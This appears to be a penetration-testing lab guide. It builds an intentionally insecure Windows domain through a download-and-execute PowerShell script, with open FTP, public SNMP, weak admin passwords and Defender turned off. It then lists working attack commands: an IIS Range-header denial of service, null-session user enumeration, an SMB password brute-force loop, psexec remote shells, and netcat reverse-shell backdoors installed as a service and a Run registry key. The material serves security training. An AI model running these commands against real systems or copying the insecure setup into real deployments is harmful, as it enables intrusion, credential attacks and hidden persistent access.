##Windows Server 2012

###Configure NetBios

![](https://s11.postimg.org/s3ne4zdgj/image.png)


###Run the setup script as Administrator

```
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/DanielRTeixeira/Academy/master/Lab/2012R2/setup.ps1')
```

Setup.ps1

```
#Install .Net 3.5

Install-WindowsFeature Net-Framework-Core

#Setup SNMP

Import-Module ServerManager
Get-WindowsFeature -name SNMP* | Add-WindowsFeature -IncludeManagementTools
REG ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SNMP\Parameters\ValidCommunities /v public /t REG_DWORD /d 8 /f
REG DELETE HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SNMP\Parameters\PermittedManagers\ /f

#Setup FTP Server

Add-WindowsFeature Web-FTP-Server

Import-Module WebAdministration

New-WebFtpSite -Name "Default FTP Site" -Port "21"
cmd /c \Windows\System32\inetsrv\appcmd set SITE "Default FTP Site" "-virtualDirectoryDefaults.physicalPath:C:\"
Set-ItemProperty "IIS:\Sites\Default Ftp Site" -Name ftpServer.security.authentication.basicAuthentication.enabled -Value $true
Set-ItemProperty "IIS:\Sites\Default Ftp Site"-Name ftpServer.security.ssl.controlChannelPolicy -Value 0
Set-ItemProperty "IIS:\Sites\Default Ftp Site" -Name ftpServer.security.ssl.dataChannelPolicy -Value 0
Add-WebConfiguration "/system.ftpServer/security/authorization" -value @{accessType="Allow";roles="";permissions="Read,Write";users="*"} -PSPath IIS:\ -location "Default Ftp Site"
Restart-WebItem "IIS:\Sites\Default FTP Site"


#Enable RDP

set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0


#Setup Users

Import-Module ActiveDirectory

NEW-ADUSER Bob -AccountPassword (ConvertTo-SecureString "P4ssw0rd" -AsPlainText -force) -enabled $true 
NEW-ADUSER John -AccountPassword (ConvertTo-SecureString "C0mput3r" -AsPlainText -force) -enabled $true 
Add-ADGroupMember "Domain Admins" Bob

```

#Windows 10

#Setup


###gpedit.msc
```
Computer Configuration/Administrative Templates/Windows Components/Windows Defender

Turn off Windows Defender
```

![](https://s11.postimg.org/rpm25dtcz/GPO.png)


##Tools

###SuperScan v4.1

http://www.mcafee.com/us/downloads/free-tools/superscan.aspx

###Advanced Port Scanner

http://www.advanced-port-scanner.com

###NetBIOS Enumerator

http://nbtenum.sourceforge.net


###NBTEnum

http://home.ubalt.edu/abento/753/enumeration/enumerationtools.html

##DOS IIS
```
curl -v 192.168.1.100/iisstart.htm -H 'Host: test' -H 'Range: bytes=20-18446744073709551615'
```

##Enumeration


###Net use

```
net use \\192.168.1.100\IPC$ "" /u:""
```

###user2sid
```
.\user2sid.exe \\192.168.1.100  "domain users"
```
###sid2user
```
.\sid2user.exe \\192.168.1.100 5 21 2845911997 4189108871 3924515755 500
```
###Loops
```
for /L %I IN (1000,1,1050) DO sid2user \\192.168.1.100 5 21 2845911997 4189108871 3924515755 %I >> users.txt
```


###NBTEnum
```
nbtenum.exe -q 192.168.1.100
```

###Loops
```
for /L %I IN (1600,1,1610) DO sid2user \\192.168.1.100 5 21 2845911997 4189108871 3924515755 %I >> users.txt
```

###PassList
```
https://goo.gl/QMiDl7
```

###Dropping SMB sessions

```
net use /del *
```
###Brute Force

```
for /f %I IN (PassList.txt) DO @echo %I & @net use \\192.168.1.100\IPC$ %I /u:Domain100.internal\Administrator 2>null && pause
```
###SMB connection
```
net use * \\192.168.1.100\C$
```

###End SMB connection

```
net use * /del
```


##Running Remote Commands


###Tasklist

```
tasklist /S 192.168.1.100 /U domain100.internal\Administrator /v
```

###PSExec

```
https://live.sysinternals.com/psexec.exe
```

###PSExec Session
```
psexec.exe /accepteula \\192.168.1.100 -u Domain100.internal\Administrator -p !Pass1234 cmd.exe
```

###Download

```
cmd.exe /c "PowerShell (New-Object System.Net.WebClient).DownloadFile('http://raw.githubusercontent.com/DanielRTeixeiraAcademy/master/Lab/Tools/nc.exe','nc.exe')
```

###Installing NETCAT as a service

```
sc create backdoor binpath= "cmd /C C:\Windows\System32\nc.exe 192.168.1.145 9999 -e cmd.exe" type=own type=interact start=auto 
```

####Start the listener on Windows 10

```
cmd.exe /c "PowerShell (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/DanielRTeixeira/Academy/master/Lab/Tools/nc.exe','nc.exe')

nc -lp 9999
```

###Run the service

```
sc start backdoor
```


###NetCat Registry Backdoor

```
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v NetCat /t REG_SZ /d "C:\Windows\System32\nc.exe 192.168.1.145 9995 -e cmd.exe"
```
